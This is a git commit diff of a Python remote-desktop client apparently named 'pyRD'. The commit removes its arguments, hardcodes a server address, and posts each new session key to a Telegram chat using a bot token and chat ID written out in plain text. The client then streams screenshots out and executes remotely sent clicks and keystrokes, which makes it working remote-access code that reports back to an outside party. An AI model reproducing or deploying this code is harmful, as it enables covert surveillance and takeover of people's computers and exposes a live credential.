7aeb48f836cabd5dd9f42ad7f74747871cb06128
Satipov Akbar <88106359+codewithakbar@users.noreply.github.com>
2024-05-06 17:12:34 +0500

    nice

--- remote.py
+++ remote.py
@@ -8,113 +8,130 @@ import io
 import requests
 import time
 import argparse
+import uuid
 
-def main(host, key):
-  r = requests.post(host+'/new_session', json={'_key': key})
-  if r.status_code != 200:    
-    print('Server not avaliable.')
-    return
+from telegram import Bot
 
-  shell = win32com.client.Dispatch('WScript.Shell')
-  PREV_IMG = None
-  while True:
-    hdesktop = win32gui.GetDesktopWindow()
+DEFAULT_HOST = 'http://192.168.50.50:5000'
+TELEGRAM_BOT_TOKEN = '5207577524:AAFWyFgWKd_yZCzSqiULfKNZ2GQb8yWI-h0'
 
-    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
-    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
-    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
-    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
 
-    # device context
-    desktop_dc = win32gui.GetWindowDC(hdesktop)
-    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
+def generate_unique_key():
+    return str(uuid.uuid4())[:4]  # Generates a random UUID and takes the first 4 characters
 
-    # memory context
-    mem_dc = img_dc.CreateCompatibleDC()
+async def send_key_to_telegram(key):
+    bot = Bot(token=TELEGRAM_BOT_TOKEN)
+    chat_id = '984573662'  # Replace 'your_telegram_chat_id' with the actual chat ID
+    await bot.send_message(chat_id=chat_id, text=f'New key generated: {key}')
 
-    screenshot = win32ui.CreateBitmap()
-    screenshot.CreateCompatibleBitmap(img_dc, width, height)
-    mem_dc.SelectObject(screenshot)
+def main(host=DEFAULT_HOST, key=None):
+    if key is None:
+        key = generate_unique_key()
 
-    bmpinfo = screenshot.GetInfo()
+    print(f'Sending key "{key}" to server at {host}')
 
-    # copy into memory 
-    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY)
+    r = requests.post(f'{host}/new_session', json={'_key': key})
+    if r.status_code != 200:    
+        print('Server not available.')
+        return
 
-    bmpstr = screenshot.GetBitmapBits(True)
+    import asyncio
+    asyncio.run(send_key_to_telegram(key))
 
-    pillow_img = Image.frombytes('RGB',
-      (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
-      bmpstr, 'raw', 'BGRX')
+    shell = win32com.client.Dispatch('WScript.Shell')
+    PREV_IMG = None
+    while True:
+        hdesktop = win32gui.GetDesktopWindow()
 
-    with io.BytesIO() as image_data:
-      pillow_img.save(image_data, 'PNG')
-      image_data_content = image_data.getvalue()
+        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
+        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
+        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
+        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
 
-    if image_data_content != PREV_IMG:
-      files = {}
-      filename = str(round(time.time()*1000))+'_'+key
-      files[filename] = ('img.png', image_data_content, 'multipart/form-data')
+        # device context
+        desktop_dc = win32gui.GetWindowDC(hdesktop)
+        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
 
-      try:
-        r = requests.post(host+'/capture_post', files=files)
-      except Exception as e:
-        pass
+        # memory context
+        mem_dc = img_dc.CreateCompatibleDC()
 
-      PREV_IMG = image_data_content
-    else:
-      #print('no desktop change')
-      pass
-    
-    # events
-    try:
-      r = requests.post(host+'/events_get', json={'_key': key})
-      data = r.json()
-      for e in data['events']:
-        print(e)
+        screenshot = win32ui.CreateBitmap()
+        screenshot.CreateCompatibleBitmap(img_dc, width, height)
+        mem_dc.SelectObject(screenshot)
 
-        if e['type'] == 'click':
-          win32api.SetCursorPos((e['x'], e['y']))
-          time.sleep(0.1)
-          win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, e['x'], e['y'], 0, 0)
-          time.sleep(0.02)
-          win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, e['x'], e['y'], 0, 0)
+        bmpinfo = screenshot.GetInfo()
 
-        if e['type'] == 'keydown':
-          cmd = ''
-          
-          if e['shiftKey']:
-            cmd += '+'
+        # copy into memory 
+        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY)
 
-          if e['ctrlKey']:
-            cmd += '^'
+        bmpstr = screenshot.GetBitmapBits(True)
 
-          if e['altKey']:
-            cmd += '%'
+        pillow_img = Image.frombytes('RGB',
+          (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
+          bmpstr, 'raw', 'BGRX')
 
-          if len(e['key']) == 1:
-            cmd += e['key'].lower()
-          else:
-            cmd += '{'+e['key'].upper()+'}'
+        with io.BytesIO() as image_data:
+            pillow_img.save(image_data, 'PNG')
+            image_data_content = image_data.getvalue()
 
-          print(cmd)
-          shell.SendKeys(cmd)
-          
-    except Exception as err:
-      print(err)
-      pass
+        if image_data_content != PREV_IMG:
+            files = {}
+            filename = str(round(time.time()*1000))+'_'+key
+            files[filename] = ('img.png', image_data_content, 'multipart/form-data')
 
-    #screenshot.SaveBitmapFile(mem_dc, 'screen.bmp')
-    # free
-    mem_dc.DeleteDC()
-    win32gui.DeleteObject(screenshot.GetHandle())
-    time.sleep(0.2)
+            try:
+                r = requests.post(f'{host}/capture_post', files=files)
+            except Exception as e:
+                pass
+
+            PREV_IMG = image_data_content
+        else:
+            #print('no desktop change')
+            pass
+        
+        # events
+        try:
+            r = requests.post(f'{host}/events_get', json={'_key': key})
+            data = r.json()
+            for e in data['events']:
+                print(e)
+
+                if e['type'] == 'click':
+                    win32api.SetCursorPos((e['x'], e['y']))
+                    time.sleep(0.1)
+                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, e['x'], e['y'], 0, 0)
+                    time.sleep(0.02)
+                    win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, e['x'], e['y'], 0, 0)
+
+                if e['type'] == 'keydown':
+                    cmd = ''
+                    
+                    if e['shiftKey']:
+                        cmd += '+'
+
+                    if e['ctrlKey']:
+                        cmd += '^'
+
+                    if e['altKey']:
+                        cmd += '%'
+
+                    if len(e['key']) == 1:
+                        cmd += e['key'].lower()
+                    else:
+                        cmd += '{'+e['key'].upper()+'}'
+
+                    print(cmd)
+                    shell.SendKeys(cmd)
+                    
+        except Exception as err:
+            print(err)
+            pass
+
+        #screenshot.SaveBitmapFile(mem_dc, 'screen.bmp')
+        # free
+        mem_dc.DeleteDC()
+        win32gui.DeleteObject(screenshot.GetHandle())
+        time.sleep(0.2)
 
 if __name__ == '__main__':
-  parser = argparse.ArgumentParser(description='pyRD')
-  parser.add_argument('addr', help='server addres', type=str)
-  parser.add_argument('key', help='acess key', type=str)
-  args = parser.parse_args()
-
-  main(args.addr, args.key)
-
+    main()
